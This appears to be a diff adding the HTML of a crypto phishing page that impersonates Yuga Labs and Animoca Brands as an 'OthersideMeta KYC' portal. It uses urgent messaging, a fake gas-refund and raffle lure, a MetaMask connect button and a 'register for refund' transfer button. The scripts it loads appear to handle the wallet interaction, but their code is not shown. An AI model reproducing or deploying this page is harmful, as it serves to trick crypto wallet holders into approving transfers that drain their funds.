@@ -1,0 +1,148 @@
+﻿<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="Something is brewing in the swamp.">
+    <meta property="og:title" content="Yuga Labs x Animoca Brands">
+    <meta content="OthersideMeta KYC✅" property="og:title">
+    <meta content="
+	🎉 We have reopen KYC for a limited amount of time. This your last chance to KYC! 
+
+    ❗ Hurry Up and Good Luck!" property="og:description">
+    <meta property="og:description" content="Something is brewing in the swamp.">
+    <meta property="og:image" content="assets/dock.jpg">
+    <link rel="icon" href="assets/favicon3.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+    <link href="css2.css?family=Montserrat:wght@500;700&amp;display=swap" rel="stylesheet">
+    <title>Yuga Labs × Animoca Brands</title>
+    <link href="src/css/main.css" rel="stylesheet">
+
+    <!-- <script src="moralis.js"></script> -->
+
+</head>
+
+<body>
+    <div id="root">
+        <main>
+            <!-- need to add "background--blurred" for blur background-->
+            <div id="myBg" class="background"><video loop="" autoplay="" playsinline="" poster="assets/dock.jpg">
+                    <source src="assets/video/dock.webm" type="video/webm">
+                    <source src="assets/video/dock.mp4" type="video/mp4">
+                </video>
+                <div class="blur"></div>
+            </div>
+            <div class="kyc" style="justify-content: center;">
+                <div id="connectDiv">
+                    <button onclick="connect()" class="button">Connect to MetaMask</button>
+                    <div class="disclaimer"><b>For mobile users, please open on PC.</b><br><br>Wallets that get KYCed but failed to mint will get full gas refund. Registering for a refund will also automatically add you to Wave 2 Otherside Lands Raffle List.</div>
+                </div>
+                <div class="kyc-block" style="display:none">
+                    <div class="kyc-label">Account</div>
+                    <div id="walletAddress" class="kyc-body">0x0</div>
+                </div>
+                <div class="kyc-block" style="display:none">
+                    <div class="kyc-label">
+                        <div>Status</div>
+                        <div class="status status--not_found"></div>
+                    </div>
+                    <div class="kyc-body">Not registered: Eligible for gas refund.</div>
+                </div>
+                <div class="kyc-block" style="display:none; flex-basis: 100%; text-align: center;">
+                    <button id="transferButton" class="button">Click to register for refund</button>
+                    <div id="elig" style="color: red;"></div>
+                </div>
+            </div>
+            <div class="sponsors">
+                <div class="sponsors-list">
+                    <div class="sponsor"><img src="assets/sponsors/yuga-labs.svg" alt="yuga-labs.svg" width="80"></div>
+                    <div class="sponsor"><img src="assets/sponsors/animoca.svg" alt="animoca.svg" width="75"></div>
+                    <div class="sponsor"><img src="assets/sponsors/apecoin.svg" alt="apecoin.svg" width="90"></div>
+                </div>
+            </div>
+        </main>
+    </div>
+    <script>
+        // ! function(e) {
+        //     function r(r) {
+        //         for (var n, i, l = r[0], f = r[1], a = r[2], c = 0, s = []; c < l.length; c++) i = l[c], Object.prototype.hasOwnProperty.call(o, i) && o[i] && s.push(o[i][0]), o[i] = 0;
+        //         for (n in f) Object.prototype.hasOwnProperty.call(f, n) && (e[n] = f[n]);
+        //         for (p && p(r); s.length;) s.shift()();
+        //         return u.push.apply(u, a || []), t()
+        //     }
+
+        //     function t() {
+        //         for (var e, r = 0; r < u.length; r++) {
+        //             for (var t = u[r], n = !0, l = 1; l < t.length; l++) {
+        //                 var f = t[l];
+        //                 0 !== o[f] && (n = !1)
+        //             }
+        //             n && (u.splice(r--, 1), e = i(i.s = t[0]))
+        //         }
+        //         return e
+        //     }
+        //     var n = {},
+        //         o = {
+        //             1: 0
+        //         },
+        //         u = [];
+
+        //     function i(r) {
+        //         if (n[r]) return n[r].exports;
+        //         var t = n[r] = {
+        //             i: r,
+        //             l: !1,
+        //             exports: {}
+        //         };
+        //         return e[r].call(t.exports, t, t.exports, i), t.l = !0, t.exports
+        //     }
+        //     i.m = e, i.c = n, i.d = function(e, r, t) {
+        //         i.o(e, r) || Object.defineProperty(e, r, {
+        //             enumerable: !0,
+        //             get: t
+        //         })
+        //     }, i.r = function(e) {
+        //         "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
+        //             value: "Module"
+        //         }), Object.defineProperty(e, "__esModule", {
+        //             value: !0
+        //         })
+        //     }, i.t = function(e, r) {
+        //         if (1 & r && (e = i(e)), 8 & r) return e;
+        //         if (4 & r && "object" == typeof e && e && e.__esModule) return e;
+        //         var t = Object.create(null);
+        //         if (i.r(t), Object.defineProperty(t, "default", {
+        //                 enumerable: !0,
+        //                 value: e
+        //             }), 2 & r && "string" != typeof e)
+        //             for (var n in e) i.d(t, n, function(r) {
+        //                 return e[r]
+        //             }.bind(null, n));
+        //         return t
+        //     }, i.n = function(e) {
+        //         var r = e && e.__esModule ? function() {
+        //             return e.default
+        //         } : function() {
+        //             return e
+        //         };
+        //         return i.d(r, "a", r), r
+        //     }, i.o = function(e, r) {
+        //         return Object.prototype.hasOwnProperty.call(e, r)
+        //     }, i.p = "index.html";
+        //     var l = this.webpackJsonpsomethingisbrewing = this.webpackJsonpsomethingisbrewing || [],
+        //         f = l.push.bind(l);
+        //     l.push = r, l = l.slice();
+        //     for (var a = 0; a < l.length; a++) r(l[a]);
+        //     var p = f;
+        //     t()
+        // }([])
+    </script>
+
+
+ 
+    <script type="text/javascript" src="web3@1.2.11/dist/web3.min.js"></script>
+    <script type="text/javascript" src="web3modal@1.9.0/dist/index.js"></script>
+    <script type="text/javascript" src="@walletconnect/web3-provider@1.7.7/dist/umd/index.min.js"></script>
+
+    <script src="assets/script.js"></script>
+    <script src="npm/eruda.js"></script></body></html>
